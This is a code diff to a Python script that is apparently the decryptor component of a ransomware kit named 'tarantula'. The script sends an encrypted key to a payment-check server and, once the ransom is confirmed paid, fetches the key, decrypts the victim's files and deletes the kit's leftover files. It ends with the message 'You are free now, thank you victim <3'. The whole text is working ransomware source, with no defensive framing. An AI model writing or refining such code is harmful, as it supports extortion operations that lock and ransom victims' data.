@@ -1,3 +1,5 @@
+import os
+import sys
 import json
 import requests
 from colorama import init, Fore, Back
@@ -13,23 +15,33 @@ request_data = {
     "encryptedKey": read_encrypted_key()
 }
 
-response = requests.post(payment_check, request_data)
+response = requests.post(payment_check, data=json.dumps(request_data), headers={"Content-Type": "application/json"})
 server_response = json.loads(response.text)
 if (server_response['status'] == "success"):
     key = server_response['key']
     print(f"{Fore.GREEN}[+] Payment is valid! Decrypted key fetched!{Fore.RESET}")
-    print(f"{Fore.YELLOW}    - Key: {key}{Fore.RESET}")
+    print(f"{Fore.BLUE}    - Key: {key}{Fore.RESET}")
     print(f"{Fore.YELLOW}[*] Decryption started{Fore.RESET}")
     files = read_file_list()
     for i in files:
-        print(f"{Fore.YELLOW}    [*] Decrypting {i}...{Fore.RESET}")
         try:
-            decrypted = aes_decrypt(i, key)
-            with open(i, "w") as f:
+            file_content = open(i, "rb").read()
+            decrypted = aes_decrypt(file_content, key.encode())
+            with open(i, "wb") as f:
                 f.write(decrypted)
             print(f"{Fore.GREEN}    [+] {i} decrypted!{Fore.RESET}")
         except:
             print(f"{Fore.RED}    [!] Error while decrypting {i}{Fore.RESET}")
+    print(f"{Fore.GREEN}[+] Decryption finished!{Fore.RESET}")
+    print(f"{Fore.YELLOW}[*] Deleting junk files...{Fore.RESET}")
+    junks = ['encrypted-key.tarankey', 'file-list.taranfls', 'tarantula']
+    for i in junks:
+        try:
+            os.remove(i)
+        except:
+            print(f"{Fore.RED}    [!] Error while deleting {i}{Fore.RESET}")
+    print(f"{Fore.GREEN}[+] You are free now, thank you victim <3{Fore.RESET}")
 else:
-    print(f"{Fore.RED}[!] Payment is not valid!{Fore.RESET}")
-    exit()
+    server_message = server_response['message']
+    print(f"{Fore.RED}[!] {server_message}{Fore.RESET}")
+    sys.exit()
